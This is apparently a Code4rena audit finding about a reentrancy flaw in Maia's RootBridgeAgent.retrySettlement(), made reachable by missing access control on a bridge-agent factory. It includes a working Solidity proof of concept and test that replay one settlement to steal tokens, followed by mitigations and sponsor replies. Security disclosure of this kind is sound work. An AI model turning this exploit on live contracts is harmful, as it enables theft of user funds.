[H-18] Reentrancy attack possible onRootBridgeAgent.retrySettlement()with missing access control forRootBridgeAgentFactory.createBridgeAgent()
Submitted bypeakbolt, also found byxuwinnie
RootBridgeAgent.retrySettlement()is lacking alockmodifier to prevent reentrancy andRootBridgeAgentFactory.createBridgeAgent()is missing access control. Both issues combined allow anyone to re-enterretrySettlement()and trigger the same settlement repeatedly.
Impact
An attacker can steal funds from the protocol by executing the same settlement multiple times before it is marked as executed.
Issue #1
InRootBridgeAgentFactory, the privileged functioncreateBridgeAgent()is lacking access control, which allows anyone to deploy a newRootBridgeAgent. Leveraging that, the attacker can inject maliciousRootRouterandBranchRouterthat can be used to trigger a reentrancy attack inretrySettlement(). Injection of the maliciousBranchRouteris done with a separate call toCoreRootRouter.addBranchToBridgeAgent()inCoreRootRouter.sol#L81-L116, refer to POC for actual steps.
functioncreateBridgeAgent(address_newRootRouterAddress)externalreturns(addressnewBridgeAgent) {newBridgeAgent=address(DeployRootBridgeAgent.deploy(wrappedNativeToken,rootChainId,daoAddress,local`AnyCall`Address,local`AnyCall`ExecutorAddress,rootPortAddress,_newRootRouterAddress));IRootPort(rootPortAddress).addBridgeAgent(msg.sender,newBridgeAgent);}
https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/factories/RootBridgeAgentFactory.sol#L75C1-L89C6
Issue #2
InRootBridgeAgent, theretrySettlement()function is not protected from reentrancy with thelockmodifier. We can then re-enter this function via the injected maliciousBranchRouter(Issue #1). The maliciousBranchRoutercan be triggered viaBranchBridgeAgentExecutorwhen the attacker performs the settlement call. That will executeIRouter(_router).anyExecuteSettlement()when additionalcalldatais passed in, as shown inBranchBridgeAgentExecutor.sol#L110.
functionretrySettlement(uint32_settlementNonce,uint128_remoteExecutionGas)externalpayable{//Update User Gas available.if(initialGas==0) {userFeeInfo.depositedGas=uint128(msg.value);userFeeInfo.gasToBridgeOut=_remoteExecutionGas;}//Clear Settlement with updated gas._retrySettlement(_settlementNonce);}
https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/RootBridgeAgent.sol#L244-L252
Proof of Concept
First append the following malicious router contracts toRootTest.t.sol:
import{SettlementParams}from"@omni/interfaces/IBranchBridgeAgent.sol";contractAttackerBranchRouterisBaseBranchRouter{uint256counter;functionanyExecuteSettlement(bytescalldatadata,SettlementParamsmemorysParams)externaloverridereturns(boolsuccess,bytesmemoryresult){// limit the recursive loop to re-enter 4 times (just for POC purpose)if(counter++ ==4)return(true,"");addressrootBridgeAgentAddress=address(uint160(bytes20(data[0:20])));// Re-enter retrySettlement() before the first settlement is marked as executedRootBridgeAgentrootBridgeAgent=RootBridgeAgent(payable(rootBridgeAgentAddress));rootBridgeAgent.retrySettlement{value:3e11}(sParams.settlementNonce,1e11);// Top-up gas for BranchBridgeAgent as retrySettlement() will refund gas after each callBranchBridgeAgentbranchAgent=BranchBridgeAgent(payable(localBridgeAgentAddress));WETH9nativeToken=WETH9(branchAgent.wrappedNativeToken());nativeToken.deposit{value:1e11}();nativeToken.transfer(address(branchAgent),1e11);}fallback()externalpayable{}}contractAttackerRouterisTest{functionreentrancyAttack(RootBridgeAgent_rootBridgeAgent,addressowner,addressrecipient,addressoutputToken,uint256amountOut,uint256depositOut,uint24toChain)externalpayable{// Approve Root Port to spend/send output hTokens.ERC20hTokenRoot(outputToken).approve(address(_rootBridgeAgent),amountOut);// Encode calldata to pass in rootBridgeAgent address and// also to trigger exeuction of anyExecuteSettlementbytesmemorydata=abi.encodePacked(address(_rootBridgeAgent));// Initiate the first settlement_rootBridgeAgent.callOutAndBridge{value:msg.value}(owner,recipient,data,outputToken,amountOut,depositOut,toChain);}}
Then add and run following test case in theRootTestcontract withinRootTest.t.sol:
functiontestPeakboltRetrySettlementReentrancy()public{//Set uptestAddLocalTokenArbitrum();addressattacker=address(0x999);// Attacker deploys RootBridgeAgent with malicious Routers// Issue 1 - RootBridgeAgentFactory.createBridgeAgent() has no access control,//           which allows anyone to create RootBridgeAgent and inject RootRouter and BranchRouter.hevm.startPrank(attacker);AttackerRouterattackerRouter=newAttackerRouter();AttackerBranchRouterattackerBranchRouter=newAttackerBranchRouter();RootBridgeAgentattackerBridgeAgent=RootBridgeAgent(payable(RootBridgeAgentFactory(bridgeAgentFactory).createBridgeAgent(address(attackerRouter))));attackerBridgeAgent.approveBranchBridgeAgent(ftmChainId);hevm.stopPrank();//Get some gas.hevm.deal(attacker,0.1ether);hevm.deal(address(attackerBranchRouter),0.1ether);// Add FTM branchBridgeAgent and inject the malicious BranchRouterhevm.prank(attacker);rootCoreRouter.addBranchToBridgeAgent{value:1e12}(address(attackerBridgeAgent),address(ftmBranchBridgeAgentFactory),address(attackerBranchRouter),address(ftmCoreRouter),ftmChainId,5e11);// Initialize malicious BranchRouter with the created BranchBridgeAgent for FTMBranchBridgeAgentattackerBranchBridgeAgent=BranchBridgeAgent(payable(attackerBridgeAgent.getBranchBridgeAgent(ftmChainId)));hevm.prank(attacker);attackerBranchRouter.initialize(address(attackerBranchBridgeAgent));// Get some hTokens for attacker to create the first settlementuint128settlementAmount=10ether;hevm.prank(address(rootPort));ERC20hTokenRoot(newAvaxAssetGlobalAddress).mint(attacker,settlementAmount,rootChainId);console2.log("STATE BEFORE:");// Attacker should have zero AvaxAssetLocalToken before bridging to FTM via the settlementconsole2.log("Attacker newAvaxAssetLocalToken (FTM) Balance:\t",MockERC20(newAvaxAssetLocalToken).balanceOf(attacker));require(MockERC20(newAvaxAssetLocalToken).balanceOf(attacker) ==0);// Attacker will start with 1e18 hTokens for the first settlementconsole2.log("Attacker Global Balance:\t",MockERC20(newAvaxAssetGlobalAddress).balanceOf(attacker));require(MockERC20(newAvaxAssetGlobalAddress).balanceOf(attacker) ==settlementAmount);// Expect next settlementNonce to be '1' before settlement creationconsole2.log("attackerBridgeAgent.settlementNonce: %d",attackerBridgeAgent.settlementNonce());require(attackerBridgeAgent.settlementNonce() ==1);// Execution history in BranchBridgeAgent is not marked yetconsole2.log("attackerBranchBridgeAgent.executionHistory(1) = %s",attackerBranchBridgeAgent.executionHistory(1));console2.log("attackerBranchBridgeAgent.executionHistory(2) = %s",attackerBranchBridgeAgent.executionHistory(2));// Attacker transfers hTokens into router, triggers the first settlement and then the reentrancy attack// Issue 2 - RootBridgeAgent.retrySettlement() has no lock to prevent reentrancy//           We can re-enter retrySettlement() via the injected malicious BranchRouter (above)//           Refer to AttackerRouter and AttackerBranchRouter contracts to see the reentrance callshevm.prank(attacker);MockERC20(newAvaxAssetGlobalAddress).transfer(address(attackerRouter),settlementAmount);hevm.prank(attacker);attackerRouter.reentrancyAttack{value:1e13}(attackerBridgeAgent,attacker,attacker,address(newAvaxAssetGlobalAddress),settlementAmount,0,ftmChainId);console2.log("STATE AFTER:");// Attacker will now have 5e19 AvaxAssetLocalToken after using 1e19 and some gas to perform 4x recursive reentrancy attackconsole2.log("Attacker newAvaxAssetLocalToken (FTM) Balance: ",MockERC20(newAvaxAssetLocalToken).balanceOf(attacker));require(MockERC20(newAvaxAssetLocalToken).balanceOf(attacker) ==5e19);// The hTokens have been used for the first settlementconsole2.log("Attacker Global Balance: ",MockERC20(newAvaxAssetGlobalAddress).balanceOf(attacker));require(MockERC20(newAvaxAssetGlobalAddress).balanceOf(attacker) ==0);// Expect next settlementNonce to be '2' as we only used '1' for the attackerconsole2.log("attackerBridgeAgent.settlementNonce: %d",attackerBridgeAgent.settlementNonce());require(attackerBridgeAgent.settlementNonce() ==2);// This shows that only execution is marked for settlementNonce '1'console2.log("attackerBranchBridgeAgent.executionHistory(1): %s",attackerBranchBridgeAgent.executionHistory(1));console2.log("attackerBranchBridgeAgent.executionHistory(2): %s",attackerBranchBridgeAgent.executionHistory(2));}
Recommended Mitigation Steps
Add alockmodifier toRootBridgeAgent.retrySettlement()and add access control toRootBridgeAgentFactory.createBridgeAgent().
0xBugsy (Maia) confirmed and commented:
Due to a cross-chain tx being composed of several txs on different networks, this would only be feasible on arbitrum, since itâ€™s the only chain where bothrootandbranchcontracts co-exist; allowing you to nest new retrys inside the previous. Otherwise, the nonce would be flagged as executed in the execution history after the first successful run. But definitely thelockshould be added.
0xBugsy (Maia) commented:
To give a little further context on my reply:The permissionless addition ofBridge Agentdoes not expose any unintended functions to theRouter, so this part is completely intended on our behalf.The core issue here, really resides on the fact that theexecutionHistory[nonce] = true;should be done in theBranchandRootBridge Agentsbefore and not after (respecting CEI), calling their respectiveExecutorwithin a try-catch block. Adding alockcan also be introduced as a safe-guard, but adding that by itself we would still be able to do this attack once within the original settlement.
0xLightt (Maia) commented:
Addressedhere.